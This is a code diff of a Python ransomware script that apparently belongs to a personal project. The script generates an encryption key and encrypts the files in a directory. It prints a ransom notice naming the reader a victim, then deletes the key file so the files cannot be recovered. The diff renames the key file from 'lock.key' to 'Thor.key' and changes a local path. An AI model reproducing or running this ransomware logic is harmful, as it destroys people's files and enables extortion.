@@ -26,8 +26,8 @@ WARNING: Do not attempt to 1) Decrypt it yourself as it is a waste of your time 
 payment.close()
 
 encryption_key = Fernet.generate_key()
-with open("lock.key", "wb") as lock_key:
-        lock_key.write(encryption_key)
+with open("Thor.key", "wb") as Thor_key:
+        Thor_key.write(encryption_key)
 
 for file in dir_files:
         with open(file, "rb") as files_to_encrypt:
@@ -41,7 +41,7 @@ print ('''
 ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!
 
 ''')
-filepath = "\Ishola Francis Ayinde\Python files\Test_Files\lock.key" ##Replace with actual directory where the ransomware program is being run.
+filepath = "\Ishola Francis Ayinde\Windows\Thor.key" #Replace with actual directory where the ransomware program is being run.
 
 try:
 	os.remove(filepath)
